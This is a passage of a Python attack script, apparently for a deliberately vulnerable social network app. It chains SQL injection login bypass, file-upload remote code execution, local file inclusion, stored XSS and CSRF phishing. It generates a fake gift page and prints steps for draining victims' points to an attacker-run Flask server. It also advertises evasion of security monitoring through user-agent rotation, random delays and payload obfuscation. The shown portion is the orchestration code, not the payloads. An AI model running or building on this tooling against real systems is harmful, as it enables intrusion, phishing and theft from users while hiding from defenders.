        print(f"🎯 Target Server: {self.base_url}")
        print(f"⚔️  Attacker Server: {self.attacker_server}")
        print(f"📅 Assessment Time: {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"\n[*] Evasion features enabled:")
        print(f"    - User-Agent rotation")
        print(f"    - Random delays between requests")
        print(f"    - Legitimate browser headers")
        print(f"    - Payload obfuscation")
        print(f"\n[!] Generated files will use CURRENT attacker server: {self.attacker_server}")
        print("="*60)

        self.log_event('SCAN_START', f'Security assessment started on {self.base_url}', 'INFO')

        # 1. SQL Injection
        print("\n[*] Initiating authentication bypass tests...")
        self._random_delay(2.0, 4.0)
        self.test_sql_injection_login()

        if not self.logged_in:
            print("\n[-] Login failed. Cannot continue.")
            self.log_event('SCAN_FAILED', 'Unable to gain access to the system', 'ERROR')
            return

        # 2. File Upload
        print("\n[*] Proceeding with file upload tests...")
        self._random_delay(2.0, 5.0)
        self.test_file_upload_rce()

        # 3. Advanced SQL Injection (post-auth)
        print("\n[*] Testing advanced SQL injection attacks...")
        self._random_delay(2.0, 4.0)
        self.test_sql_injection_advanced()

        # 4. LFI
        print("\n[*] Testing local file inclusion...")
        self._random_delay(2.0, 4.0)
        self.test_lfi()

        # 5. Check for old posts with incorrect attacker URLs
        print("\n[*] Checking for old malicious posts...")
        self._random_delay(1.0, 2.0)
        self.clear_old_posts()

        # 6. Test Stored XSS
        print("\n[*] Testing Stored XSS vulnerabilities...")
        self._random_delay(2.0, 4.0)
        self.test_xss_stored()

        # 7. Test CSRF Phishing
        print("\n[*] Testing CSRF phishing attacks...")
        self._random_delay(3.0, 6.0)
        self.test_csrf_phishing()

        # 8. fake-gift 페이지 생성
        self.generate_fake_gift_page()
        
        self.log_event('SCAN_COMPLETE', f'Security assessment completed. {sum(len(v) for v in self.vulnerabilities.values())} vulnerabilities found', 'INFO')
        
        # 6. 리포트 생성
        self.print_section("Generating Reports")
        html_report = self.generate_html_report()
        json_report = self.generate_json_report()
        md_report = self.generate_markdown_report()

        # 콘솔 요약 출력
        self.print_report()

        print(f"\n[+] Assessment complete!")
        print(f"[+] All reports saved to 'reports/' folder:")
        print(f"    - HTML Report: {html_report}")
        print(f"    - JSON Report: {json_report}")
        print(f"    - Markdown Report: {md_report}")
        print(f"    - fake-gift.html: reports/fake-gift.html")
    
    def print_report(self):
        """콘솔 요약 출력"""
        self.print_section("Assessment Summary")
        
        total = sum(len(v) for v in self.vulnerabilities.values())
        print(f"\n✓ Total vulnerabilities found: {total}\n")
        
        for vuln_type, vulns in self.vulnerabilities.items():
            if vulns:
                print(f"\n[{vuln_type.upper()}] - {len(vulns)} found")
                print("-" * 60)
                for i, vuln in enumerate(vulns, 1):
                    print(f"{i}. {vuln.get('description', vuln.get('type', 'N/A'))}")
                    if 'cvss_score' in vuln:
                        print(f"   CVSS Score: {vuln['cvss_score']}")
                    if 'impact' in vuln:
                        print(f"   Impact: {vuln['impact']}")
                    print()
        
        print(f"\n" + "="*60)
        print("CSRF Attack Setup Instructions")
        print("="*60)
        print(f"[*] Next steps:")
        print(f"    1. Start Flask server: python3 attacker_server.py")
        print(f"    2. Verify fake-gift.html is accessible: {self.attacker_server}/fake-gift")
        print(f"    3. Victim clicks malicious post link")
        print(f"    4. Monitor dashboard: {self.attacker_server}/")
        print(f"    5. Check attack logs in real-time")
        print(f"\n[*] Expected results:")
        print(f"    - Victim's points transferred to attacker (ID: {self.attacker_user_id})")
        print(f"    - Victim's profile modified")
        print(f"    - All actions logged to Flask server")


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 3:
        print("Usage: python3 auto_fixed.py <target_url> <attacker_server>")
        print("Example: python3 auto_fixed.py http://18.179.53.107/vulnerable-sns/www http://13.158.67.78:5000")
        sys.exit(1)
    
    target = sys.argv[1]
    attacker_server = sys.argv[2]
    
    attacker = VulnerableSNSAttacker(target, attacker_server)
    attacker.run_assessment()
    
    print("\n" + "="*60)
    print("✅ Assessment completed successfully!")
    print(f"📊 All reports saved in 'reports/' folder")
    print(f"   - HTML: Interactive report with styling")
    print(f"   - JSON: Machine-readable data")
    print(f"   - Markdown: GitHub-compatible documentation")
    print(f"🎯 Monitor attacks at: {attacker_server}")
    print(f"🛡️  Evasion techniques applied to bypass security monitoring")
    print("="*60)